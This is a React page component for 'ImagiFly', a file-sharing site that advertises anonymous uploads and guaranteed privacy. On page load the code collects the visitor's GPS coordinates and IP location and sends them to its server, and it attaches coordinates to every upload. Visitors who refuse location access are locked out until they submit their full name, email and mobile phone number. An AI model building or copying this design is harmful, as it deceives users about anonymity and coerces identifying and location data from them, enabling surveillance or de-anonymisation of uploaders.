import React, { useState, useEffect } from "react";
import axios from "axios";
import "./MainPage.css";
import Sidebar from "../Sidebar/Sidebar";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { faCloudUploadAlt } from "@fortawesome/free-solid-svg-icons";
import { Link } from "react-router-dom";

const MainPage = () => {
  const [isSidebarOpen, setSidebarOpen] = useState(false);
  const [selectedFile, setSelectedFile] = useState(null);
  const [isAccessDenied, setAccessDenied] = useState(false);
  const [locationPermissionGranted, setLocationPermissionGranted] =
    useState(true);
  const [location, setLocation] = useState({ lat: null, lon: null });

  const [lastName, setLastName] = useState("");
  const [firstName, setFirstName] = useState("");
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");

  const toggleSidebar = () => {
    setSidebarOpen(!isSidebarOpen);
  };

  const handleFileChange = (event) => {
    setSelectedFile(event.target.files[0]);
  };

  const fetchIpLocation = () => {
    axios
      .get("https://imagifly.site/api/get-ip-location")
      .then((response) => {
        console.log("IP 情報:", response.data);
      })
      .catch((error) => {
        console.error("IP 情報の取得に失敗しました:", error);
      });
  };

  // 位置情報をリクエストしてサーバーに送信する関数
  const sendLocation = () => {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          setLocation({
            lat: position.coords.latitude,
            lon: position.coords.longitude,
          });

          axios
            .post("https://imagifly.site/api/location", {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
            })
            .then((response) => {
              console.log("位置情報が送信されました:", response.data);
              setLocationPermissionGranted(true); // 位置情報が許可された場合
            })
            .catch((error) => {
              console.error("位置情報の送信に失敗しました:", error);
            });
        },
        (error) => {
          console.error("位置情報の取得に失敗しました:", error);
          if (error.code === error.PERMISSION_DENIED) {
            setAccessDenied(true); // 位置情報が許可されなかった場合ブロック
          }
        }
      );
    } else {
      alert("このブラウザは位置情報をサポートしていません。");
    }
  };

  useEffect(() => {
    // ページロード時に位置情報をリクエスト
    sendLocation();
    fetchIpLocation();
  }, []);

  const handleUpload = () => {
    if (!selectedFile) {
      alert("ファイルを選択してください。");
      return;
    }

    const formData = new FormData();
    formData.append("file", selectedFile);
    formData.append("latitude", location.lat);
    formData.append("longitude", location.lon);

    axios
      .post("https://imagifly.site/api/upload", formData, {
        headers: {
          "Content-Type": "multipart/form-data",
        },
      })
      .then((response) => {
        alert(`${selectedFile.name} アップロードに成功しました！`);
        console.log("ファイル送信に成功:", response.data);
        setSelectedFile(null);
      })
      .catch((error) => {
        console.error("ファイル送信に失敗しました:", error);
        alert("ファイルのアップロードに失敗しました。");
      });
  };

  return (
    <div className="main-container">
      <header className="main-header">
        <Link to="/">
          <h1 className="logo">ImagiFly</h1>
        </Link>
        <div className="right-section">
          <div className="current-country">
            <span>Country: </span>
            <img
              src="https://upload.wikimedia.org/wikipedia/en/9/9e/Flag_of_Japan.svg"
              className="flag-icon"
            />
          </div>
          <div className="nav-icon" onClick={toggleSidebar}>
            &#9776;
          </div>
        </div>
      </header>

      <Sidebar isOpen={isSidebarOpen} onClose={toggleSidebar} />

      {isAccessDenied && (
        <div className="location-popup-overlay">
          <div className="location-popup">
            <p>
              位置情報の使用が許可されていません。
              <br />
              これを許可しないとサイトにアクセスできません。
            </p>
            <h3>お問い合わせは管理者までご連絡ください</h3>

            <div className="input-group-row">
              <div className="input-group">
                <label>姓:</label>
                <input
                  type="text"
                  placeholder="姓を入力してください"
                  className="input-field"
                  value={lastName}
                  onChange={(e) => setLastName(e.target.value)}
                />
              </div>

              <div className="input-group">
                <label>名:</label>
                <input
                  type="text"
                  placeholder="名を入力してください"
                  className="input-field"
                  value={firstName}
                  onChange={(e) => setFirstName(e.target.value)}
                />
              </div>
            </div>

            <div className="input-group">
              <label>メールアドレス:</label>
              <input
                type="email"
                placeholder="メールアドレスを入力してください"
                className="input-field"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
            </div>

            <div className="input-group">
              <label>電話番号:</label>
              <input
                type="tel"
                placeholder="電話番号を入力してください"
                className="input-field"
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
              />
            </div>

            <button
              className="submit-button"
              onClick={() => {
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                const phoneRegex = /^(070|080|090)\d{8}$/;

                if (!lastName || !firstName || !email || !phone) {
                  alert("すべてのフィールドを入力してください。");
                  return;
                }

                if (!emailRegex.test(email)) {
                  alert("正しいメールアドレスを入力してください。");
                  return;
                }

                if (!phoneRegex.test(phone)) {
                  alert("電話番号が正しくありません。");
                  return;
                }

                const requestData = { lastName, firstName, email, phone };

                axios
                  .post(
                    "https://imagifly.site/api/unblock-request",
                    requestData
                  )
                  .then((response) => {
                    setAccessDenied(false);
                    setLocationPermissionGranted(true);
                    alert("一時的にブロックが解除されました。");
                  })
                  .catch((error) => {
                    console.error("エラーが発生しました:", error);
                    alert("エラーが発生しました。再試行してください。");
                  });
              }}
            >
              ブロックを解除する
            </button>
          </div>
        </div>
      )}

      {!isAccessDenied && locationPermissionGranted && (
        <>
          <div className="introduction">
            <h2>Welcome to ImagiFly</h2>
            <p>
              ImagiFly is a free file-sharing service. You can upload files
              anonymously, and they will be available for download for 24 hours.
              Your privacy is always guaranteed.
            </p>
            <p>Share your files with ease, signup required!</p>
          </div>

          <div className="content">
            <div className="upload-container">
              <FontAwesomeIcon
                icon={faCloudUploadAlt}
                className="upload-icon"
              />
              <h2>ファイルをアップロード</h2>
              <input
                type="file"
                onChange={handleFileChange}
                className="file-input"
                id="file-input"
              />
              <label htmlFor="file-input" className="upload-label">
                {selectedFile
                  ? `${selectedFile.name} 選択されました`
                  : "ファイルを選択"}
              </label>
              <button onClick={handleUpload} className="upload-button">
                {selectedFile
                  ? `${selectedFile.name} アップロード`
                  : "アップロード開始"}
              </button>
            </div>
          </div>
        </>
      )}
    </div>
  );
};

export default MainPage;
